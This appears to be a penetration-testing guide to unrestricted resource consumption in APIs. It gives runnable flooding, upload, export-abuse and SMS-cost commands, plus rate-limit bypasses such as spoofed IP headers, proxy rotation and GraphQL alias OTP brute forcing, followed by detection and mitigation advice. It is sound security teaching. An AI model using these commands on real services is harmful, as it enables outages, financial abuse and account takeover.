---
title: Unrestricted Resource Consumption
---

# Unrestricted Resource Consumption

Unrestricted resource consumption is a vulnerability where an API allows excessive use of its resources without sufficient constraints, leading to performance degradation, service unavailability, or financial costs.

---

## Understanding Resource Consumption

Resources that can be exhausted:

- CPU
- Memory
- Disk Storage
- Database Connections
- Thread Pools
- Background Jobs
- Email/SMS Services
- Network Bandwidth

---

## Attack Surfaces

- OTP / SMS endpoints
- Password reset functionality
- File upload endpoints
- Report generation
- Export (CSV/PDF)
- Image processing APIs
- GraphQL endpoints
- Email sending endpoints

---

## Exploitation Techniques

### 1. Request Flooding Attack

Attackers send a large number of requests to a resource-heavy endpoint to exhaust backend resources.

This repeatedly triggers expensive operations such as:

- OTP sending
- email sending
- report generation
- export functionality

Example:

```bash
curl -X POST https://api.example.com/otp/send \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890"}' --silent
```

Repeat this request multiple times (e.g., 1000+ requests) or automate it using Burp Intruder with zero delay.

---

### 2. Concurrent Request Attack

Attackers send multiple simultaneous requests to increase resource usage rapidly.

Example:

```bash
# Send 100 concurrent OTP requests
seq 1 100 | xargs -I@ -P50 curl -X POST https://api.example.com/otp/send \
  -H "Content-Type: application/json" \
  -d '{"phone":"+1234567890"}' --silent
```

This can also be automated using Burp Intruder.

---

### 3. Large File Upload Attack

Attackers upload extremely large files or multiple files to consume disk space and processing resources.

Example:

```bash
curl -X POST https://api.example.com/upload \
  -F "file=@/path/to/very_large_file.zip" \
  -H "Authorization: Bearer <token>"
```

You can generate a large dummy file using:

```bash
fallocate -l 1G testfile.zip
```

Note: `fallocate` creates a sparse file - it's instantly "1GB" in size on paper but mostly contains no real written data, so it won't stress disk I/O the way a genuinely dense file would. Fine for testing whether an endpoint rejects oversized uploads by size alone; if you need to test actual processing/disk-write load, generate a dense file instead:

```bash
dd if=/dev/urandom of=testfile_dense.zip bs=1M count=1024
```

---

### 4. Expensive Operation Abuse

Attackers repeatedly trigger endpoints performing heavy backend processing.

Examples:

- report generation
- CSV/PDF export
- analytics processing
- image processing

```bash
curl -X POST https://api.example.com/reports/export \
  -H "Content-Type: application/json" \
  -d '{
        "type": "csv",
        "date_range": "1900-01-01:2026-01-01",
        "include_all": true
      }'
```

This can also be automated using Burp Intruder to repeatedly trigger heavy backend operations.

---

### 5. Third-Party Service Abuse

Attackers repeatedly trigger APIs connected to metered or costly services.

Examples:

- SMS sending
- email sending
- payment APIs
- AI generation APIs

```bash
curl -X POST https://api.example.com/auth/send-otp \
  -H "Content-Type: application/json" \
  -d '{
        "phone": "+1234567890"
      }'
```

Repeat this request multiple times (e.g., 1000+ requests) or automate it using Burp Intruder with zero delay.

---

## Bypassing Protections

Bypassing protections refers to attempts to circumvent security controls such as rate limiting, authentication checks, or input validation. Rate limiting is one such protection designed to restrict repeated requests, and weaknesses in its implementation may allow it to be bypassed using the techniques outlined below:

1. **Exploring Similar Endpoints**
    
    Brute force variations of the targeted endpoint like `/api/v3/sign-up`, `/Sing-up`, `/SignUp`, `/singup`, `/api/v1/sign-up`.
    
    Example: `POST /api/v1/sign-up` or `POST /Sing-up`
    
2. **Incorporating Blank Characters**
    
    Use blank bytes like `%00`, `%0d%0a`, `%0d`, `%0a`, `%09`, `%0C`, `%20` in code/parameters.
    
    Example: `code=1234%0a` or `email=test%0d%0a@example.com`
    
3. **Manipulating IP Origin Headers**
    
    Modifying headers to alter the perceived IP origin can help evade IP-based rate limiting. Headers such as `X-Originating-IP`, `X-Forwarded-For`, `X-Remote-IP`, `X-Remote-Addr`, `X-Client-IP`, `X-Host`, `X-Forwared-Host`, including using multiple instances of `X-Forwarded-For`, can be adjusted to simulate requests from different IPs.
    
    Example:
    
    ```
    X-Originating-IP: 127.0.0.1
    X-Forwarded-For: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    X-Client-IP: 127.0.0.1
    X-Host: 127.0.0.1
    X-Forwared-Host: 127.0.0.1
    
    # Double X-Forwarded-For header example
    X-Forwarded-For:
    X-Forwarded-For: 127.0.0.1
    ```
    
4. **Changing Other Headers**
    
    Alter request headers like `User-Agent`, `Cookie`, `Referer` to evade tracking if used to identify and track request patterns.
    
    Example: `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
    
5. **Leveraging API Gateway Behavior**
    
    Vary/add parameters like `/resetpwd?someparam=1` for unique requests as some API gateways are configured to apply rate limiting based on the combination of endpoint and parameters.
    
    Example: `GET /resetpwd?someparam=1&junk=abc`
    
6. **Logging into Account Before Attempts**
    
    When testing login functionalities logging into an account before each attempt, or every set of attempts, might reset the rate limit counter.  Use Burp Pitchfork for credential rotation.
    
    Example: Pitchfork → `admin:1234`, `user:pass`, `test:123456`
    
7. **Utilizing Proxy Networks** (see also technique #15 for the CDN-specific version of this same idea)
    
    Deploying a network of proxies to distribute the requests across multiple IP addresses can effectively bypass IP-based rate limits. By routing traffic through various proxies, each request appears to originate from a different source, diluting the rate limit’s effectiveness.
    
    Example: `HTTPS_PROXY=proxy1:8080 curl -X POST /api/login`
    
8. **Splitting Across Accounts/Sessions**
    
    Use multiple accounts/tokens if per-account limited.
    
    Example:
    
    ```bash
    curl -X POST https://api.example.com/data \
      -H "Authorization: Bearer token1" \
      -H "Content-Type: application/json" \
      -d '{"query":"example request"}'
    -----------------------------------------------------------------------------------
    curl -X POST https://api.example.com/data \
      -H "Authorization: Bearer token2" \
      -H "Content-Type: application/json" \
      -d '{"query":"example request"}'
    ```
    
9. **Response Oracle Check (separate from rate-limit bypass)**
    
    This isn't actually a rate-limit bypass - it's a check for a *different* bug that's worth testing alongside rate limiting: does the response (status code, timing, body length) differ between a valid and invalid code, even while rate limiting is enforced correctly? If so, an attacker doesn't need to bypass the rate limit at all - the oracle itself may let them narrow down the valid code faster than brute force would otherwise require, or confirm account/OTP validity without ever exceeding the limit.
    
    Example:
    
    ```
    Attempt 1 → OTP: 123456 → Response: 401 Unauthorized (87ms)
    Attempt 2 → OTP: 654321 → Response: 401 Unauthorized (85ms)
    Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
    ```
    
    Flag this separately in your report from any rate-limiting finding - it's a distinct root cause (information disclosure via response variance) even though you noticed it during the same testing session.
    
10. **HTTP/2 Multiplexing & Pipelining**
    
    Send multiple parallel requests (streams) over a single TCP/TLS connection to bypass weak rate limits.
    
    Note: plain `curl` cannot multiplex many streams over one HTTP/2 connection - each `curl` invocation opens its own connection regardless of `-P` value in xargs, so this only demonstrates concurrent *connections*, not single-connection multiplexing. To actually test true HTTP/2 multiplexing (many streams, one connection), use a tool built for it:
    
    ```bash
    # h2load - sends N requests over a fixed number of connections/streams, purpose-built for HTTP/2 load testing
    h2load -n 100 -c 1 -m 100 https://target/api/v2/verify
    # -n 100  = 100 total requests
    # -c 1    = 1 TCP connection
    # -m 100  = 100 concurrent streams multiplexed over that single connection
    
    # If h2load isn't available, this curl-based approach at least demonstrates
    # concurrent-request flooding (multiple connections, not true multiplexing):
    seq 1 100 | xargs -I@ -P100 curl -k --http2-prior-knowledge -X POST \
      -H "Content-Type: application/json" \
      -d '{"code":"@"}' https://target/api/v2/verify &>/dev/null
    ```
    
11. **GraphQL aliases & batched operations**
    
    GraphQL allows the client to send several logically independent queries or mutations in a single request by prefixing them with aliases. Because the server executes every alias but the rate-limiter often counts only one request, this is a reliable bypass for login or password-reset throttling.
    
    Example:
    
    ```graphql
    mutation bruteForceOTP {
      a: verify(code:"111111") { token }
      b: verify(code:"222222") { token }
      c: verify(code:"333333") { token }
      # … add up to dozens of aliases …
    }
    ```
    
12. **Batch/Bulk REST Endpoints**
    
    Some APIs expose helper endpoints such as `/v2/batch` or accept an **array of objects** in the request body. If the limiter is placed in front of the *legacy* endpoints only, wrapping multiple operations inside a single bulk request may completely sidestep the protection.
    
    ```json
    [
      {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"123"}},
      {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"456"}}
    ]
    ```
    
13. **Timing Sliding-Window**
    
    A classic token-bucket or leaky-bucket limiter *resets* on a fixed time boundary (for example, every minute). If the window is known (e.g. via error messages such as `X-RateLimit-Reset: 27`), fire the maximum allowed number of requests **just before** the bucket resets, then immediately fire another full burst.
    
    Example:
    
    ```
    |<-- 60 s window ‑->|<-- 60 s window ‑->|
           ######                 ######
    ```
    
14. **Upgrading to WebSockets / gRPC streaming after the handshake**
    
    Many edge rate-limiters only inspect the **initial HTTP request**. Once the connection is upgraded to WebSocket (HTTP 101) or gRPC bidirectional streaming, subsequent messages often bypass request-per-second counters because they are no longer separate HTTP requests.
    
    Example:
    
    ```bash
    # Flood 1,000 OTP guesses through a single WebSocket connection
    seq -w 000000 000999 | websocat -n ws://target.tld/api/verify-ws
    
    # gRPC streaming: send multiple Verify requests in one stream
    grpcurl -d @ -plaintext target.tld:50051 service.VerifyOTP/Stream <<'EOF'
    { "code": "111111" }
    { "code": "222222" }
    { "code": "333333" }
    EOF
    ```
    
15. **CDN PoP-Sharded Counters**
    
    Some CDNs shard rate-limit counters **per data center/PoP instead of globally**. Cloudflare explicitly states counters are not shared across data centers. By routing requests through egress nodes in many regions (residential proxy pools, anycast VPNs, or cloud VMs pinned to different continents), you multiply the allowed throughput: every PoP maintains an independent bucket for the same key.
    
    Quick and dirty layout using open proxies (example with `proxychains` + a country‑rotating list):
    
    ```bash
    for p in $(cat proxies.txt); do
      HTTPS_PROXY=$p curl -s -X POST https://target/api/login -d @payload.json &
    done
    wait
    ```
    

---

## Advanced Attack Scenarios

### 1. Chaining Resource Exhaustion with a Secondary Vulnerability

Resource exhaustion becomes far more severe when the "expensive" endpoint also has a second flaw that amplifies the cost per request. For example, if a report-export endpoint accepts a date range and internally builds a query without proper indexing, a single crafted request can force a full table scan - combine that with concurrent request flooding and you turn what looks like a manageable load-testing finding into a full outage from a handful of requests, not thousands.

```bash
# Instead of just flooding with a normal date range, target the specific input shape that makes the backend query maximally expensive
for i in {1..20}; do
  curl -X POST https://api.example.com/reports/export \
    -H "Content-Type: application/json" \
    -d '{"type":"csv","date_range":"1900-01-01:2026-01-01","sort":"random","include_all":true}' &
done
wait
```

This is worth calling out specifically in a report: 20 requests causing an outage is a materially different severity story than needing 10,000 requests to achieve the same result, even though both technically fall under "unrestricted resource consumption."

### 2. Asynchronous Job Queue Exhaustion

Many APIs offload expensive work (report generation, video processing, bulk emails) to a background job queue rather than processing it synchronously. This changes the attack surface: the initial HTTP request itself may look cheap and pass rate limiting easily, while the real cost lands on a worker pool minutes later, disconnected from the request that caused it.

```bash
# Submit many "cheap-looking" requests that each queue an expensive background job
for i in {1..500}; do
  curl -X POST https://api.example.com/jobs/generate-report \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"report_type":"full_analytics","async":true}' &
done
wait
```

**Why this matters for severity:** rate limiting on the *submission* endpoint often doesn't map 1:1 to protection against *worker* exhaustion - check whether there's a separate queue depth limit or per-user job quota, since the HTTP-level rate limit alone frequently isn't enough here.

### 3. Multipart/Batch Amplification

Where an API accepts a batch or multipart request (see bypass technique #12), the "cost" of resource consumption isn't 1 unit per HTTP request - it can be N units per request, where N is however many operations you can pack into a single batch body before the server rejects it for being too large. Test how large a batch the server actually accepts before any batch-size limit kicks in; if there is no batch-size cap, a single request can carry the resource cost of thousands.

---

## Framework-Specific Scenarios

Resource consumption limits are frequently framework-level defaults that get left unconfigured, rather than something developers explicitly disable - meaning the vulnerability is often "nobody changed the default" rather than "somebody made an active mistake." Worth checking framework-specific defaults directly:

### Node.js / Express

Express itself has no built-in request body size limit - it depends entirely on whichever body-parsing middleware is used (`body-parser`, `express.json()`), and the default limit for `express.json()` is 100kb, which many teams raise significantly (or remove) for legitimate large-payload use cases without adding a replacement check elsewhere.

```bash
# Test the actual configured limit directly
curl -X POST https://api.example.com/endpoint \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$(python3 -c 'print("A"*5000000)')\"}"
# A 413 Payload Too Large response confirms a limit is enforced; a 200/500 with a large response time is worth escalating
```

### Python / Django

Django's `DATA_UPLOAD_MAX_MEMORY_SIZE` (default 2.5MB) and `FILE_UPLOAD_MAX_MEMORY_SIZE` govern request body and file upload size respectively - check whether these have been raised or disabled (`None`) in a target's configuration by testing uploads incrementally past the 2.5MB default.

### GraphQL (framework-agnostic)

Unlike REST, a single GraphQL request can be made arbitrarily expensive through nesting or aliasing (see bypass technique #11) regardless of which backend framework serves it. The relevant defenses are query cost analysis and depth limiting - libraries like `graphql-cost-analysis`, `graphql-depth-limit`, or `graphql-query-complexity` - and their *absence* is the actual vulnerability, not a framework misconfiguration per se. Confirm whether a target's GraphQL endpoint enforces any of these by submitting a deeply nested or heavily aliased query (see the Exploitation section above) and checking whether it's rejected before execution or actually processed.

---

## Detection Techniques

### Manual Detection Techniques

1. **High Request Frequency Testing**
    
    Send multiple requests to the same functionality and observe server behavior.
    
    Indicators of Vulnerability:
    
    - No rate limiting enforced
    - No `429 Too Many Requests` response
    - Same action triggered repeatedly
    - No cooldown timer
2. **Resource-Heavy Operation Testing**
    
    Trigger operations that generate large processing load and repeat them.
    
    Indicators of Vulnerability:
    
    - Server response becomes slow
    - Large responses generated
    - Multiple background jobs created
    - Requests processed without restriction
    - No throttling mechanisms
3. **Large Input Testing**
    
    Increase input size to force heavy backend processing.
    
    Examples:
    
    - Large file uploads
    - Large export ranges
    - Large dataset requests
    - Deep GraphQL queries
    
    Indicators of Vulnerability:
    
    - Large responses returned
    - Processing time increases
    - No input size limits
    - No request rejection

### Automated Detection Techniques

**Burp Suite**

- **Intruder**: Send a large number of identical requests to detect missing rate limiting and unrestricted processing.
- **Turbo Intruder**: Perform high-concurrency request flooding to identify resource exhaustion conditions.

---

## Impacts

- Denial of Service (DoS)
- Server resource exhaustion
- Application slowdown
- Database overload
- Worker thread exhaustion
- Memory exhaustion
- Disk exhaustion
- Increased infrastructure cost
- Email/SMS abuse
- Queue overload
- Service outage

---

## Tools

- Burp Suite (Intruder, Turbo Intruder)
- ffuf, wfuzz
- h2load (HTTP/2 load testing with true multiplexing)
- websocat (WebSocket flooding/testing)
- grpcurl (gRPC streaming tests)

---

## Mitigation & Preventions

- Implement rate limiting per user/IP
- Enforce pagination limits
- Restrict file upload size
- Add request throttling
- Implement CAPTCHA on expensive endpoints
- Limit background job creation
- Set request timeout limits
- Use caching for expensive operations
- Add per-user resource quotas
- Implement concurrency limits
- Use WAF protections for DoS attempts
- Enforce query cost/depth limits on GraphQL endpoints
- Apply rate limiting at the protocol level for WebSocket/gRPC streams, not just on the initial handshake

---

## Good To Read

[https://hackerone.com/reports/640781](https://hackerone.com/reports/640781) 

[https://hackerone.com/reports/812754](https://hackerone.com/reports/812754) 

[https://hackerone.com/reports/670572](https://hackerone.com/reports/670572) 

[https://hackerone.com/reports/2818147](https://hackerone.com/reports/2818147) 

[https://hackerone.com/reports/1543718](https://hackerone.com/reports/1543718) 

[https://hackerone.com/reports/481518](https://hackerone.com/reports/481518) 

---

## References

[https://learn.snyk.io/lesson/unrestricted-resource-consumption/?ecosystem=python](https://learn.snyk.io/lesson/unrestricted-resource-consumption/?ecosystem=python) 

[https://www.paloaltonetworks.in/cyberpedia/unrestricted-resource-consumption](https://www.paloaltonetworks.in/cyberpedia/unrestricted-resource-consumption) 

[https://blog.securelayer7.net/unrestricted-resource-consumption/](https://blog.securelayer7.net/unrestricted-resource-consumption/) 

[https://securityboulevard.com/2025/08/exploiting-api4-8-real-world-unrestricted-resource-consumption-attack-scenarios-and-how-to-stop-them/](https://securityboulevard.com/2025/08/exploiting-api4-8-real-world-unrestricted-resource-consumption-attack-scenarios-and-how-to-stop-them/)